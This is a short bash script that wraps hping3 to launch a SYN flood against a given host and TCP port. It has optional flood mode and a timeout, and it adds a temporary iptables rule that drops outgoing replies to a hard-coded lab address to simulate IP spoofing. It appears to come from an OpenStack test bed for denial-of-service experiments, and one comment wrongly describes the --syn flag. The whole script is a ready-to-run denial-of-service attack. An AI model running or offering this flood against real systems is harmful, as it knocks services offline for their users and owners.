#!/bin/bash

display_usage() {
	echo "Script to run hping3."

	echo -e "\nUsage:"
    echo -e "\t$0 <IFACE> <HOSTNAME> <PORT> <INTERVAL> <TIMEOUT> [-q]\n"
		echo -e "\nOptions:"
    echo -e "\t        IFACE - Network interface"
    echo -e "\t     HOSTNAME - Hostname under attack."
		echo -e "\t         PORT - TCP port"
		echo -e "\t     INTERVAL - Number of seconds or micro seconds between sending each packet."
    echo -e "\t                  X : set wait to X seconds"
    echo -e "\t                  uX : set wait to X micro seconds"
    echo -e "\t                  flood : set flood mode. Sent packets as fast as possible."
    echo -e "\t      TIMEOUT - Amount of time it should run [10s, 30m, 1h, 1d]. 0 runs indefinitely."
    echo -e "\t-q (optional) - Quiet output. Nothing is displayed except the summary lines at startup time and when finished. \n"
  }

# If less than two arguments supplied, display usage.
if [  $# -lt 5 ]
then
    display_usage
    exit 1
fi

IFACE=$1
DST_HOST=$2
PORT=$3
INTERVAL=$4
TIMEOUT=$5
QUIET=$6

IFACE_IP=$(ip a l $IFACE | awk '$1 == "inet" {print $2}' | cut -d/ -f1 | paste -sd ',')

OPTS=""
TIMEOUT_CMD=""

if [ "$TIMEOUT" != "0" ]; then
  TIMEOUT_CMD="timeout -s SIGINT $TIMEOUT"
fi

if [ "$INTERVAL" == "flood" ]; then
    OPTS="--flood"
else
    OPTS="-i $INTERVAL"
fi

if [[ -n $QUIET ]]; then
  OPTS=$OPTS" "$QUIET
fi

# ADD firewall rule to block send SYN-ACK/ACK
# To simulate IP Spoofing // Openstack has protection against IP Spoofing
iptables -A OUTPUT -s $IFACE_IP -d 10.50.1.110 -p tcp --dport 80 ! --syn -j DROP


# hping3 params:
#    --syn : Instructs siege how long to delay (in seconds) between each page request.
#       -i : Wait  the  specified  number of seconds or micro seconds between sending each packet.
#            --interval X set wait to X seconds, --interval uX set wait to X micro seconds.
#  --flood : Sent packets as fast as possible. This is ways faster than to specify the -i u0 option.
#       -p : Set destination port.

$TIMEOUT_CMD hping3 -I $IFACE --syn $OPTS -p $PORT $DST_HOST


# DELETE firewall rule to block send SYN-ACK/ACK
iptables -D OUTPUT -s $IFACE_IP -d 10.50.1.110 -p tcp --dport 80 ! --syn -j DROP

